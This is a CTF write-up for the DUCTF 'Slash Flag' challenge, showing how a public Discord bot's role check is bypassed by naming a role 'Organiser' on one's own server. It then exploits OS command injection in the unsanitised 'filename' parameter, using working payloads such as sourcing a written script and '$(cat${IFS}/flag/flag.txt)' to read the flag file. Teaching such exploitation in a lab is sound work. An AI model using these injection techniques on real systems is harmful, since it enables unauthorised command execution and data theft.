# Slash Flag Writeup

1. Find the storage bot on the DUCTF discord server.
2. The about me section has the github link for the storage bot
3. Reading the code, you will find that only users with the role with the name "Organiser" can execute commands.

```js
// /events/interactionCreate.js - line 19
const isOrganiser = roles.some((a) => {
    return a === "Organiser";
});

if (!isOrganiser) {
    return await interaction.reply("You're not an organiser so you can't use this bot.");
}
```

4. Attempting to add the bot to your own server will be successful meaning that it is a public bot. This will allow us to create a role with the name "Organiser" on our own server.
5. Now that we can execute slash commands on the bot you will find the source code for these commands on the github repository.
6. Reading the code, you will notice the "create" command is vulnerable to OS command injection via the "filename" parameter. ~~This is because parameters are usually sanitised with the quote function from the "shell-quote" library however, the "filename" parameter is not.~~ I was proved wrong. Well done! `"$(cat${IFS}/flag/flag.txt)"` avoids spaces.

```js
// /commands/create.js - Line 27
const filename = interaction.options.getString("filename").toUpperCase();
const text = quote(interaction.options.getString("text").split(" "));

if (text.length > FILE_LIMIT) {
    return await interaction.reply("Sorry your text is too big aka I don't have enough money to give to Google :)");
}

try {
    await runCommand(`echo '${text}' > ${filename}`, interaction.guildId);
```

7. The fact that filename is turned to all uppercase makes this challenge a bit tricky. OS commands are case-sensitive meaning that our payload will always be uppercase. What we can do instead is to write a script in a file to run whatever commands we want and source the script, redirecting the output to another file to read.

```
/create "A" "cat /flag/flag.txt"
/create "B;. ./A > C" "whatever"
/open "C"
```
8. This should output the flag as the contents of the "C" file.
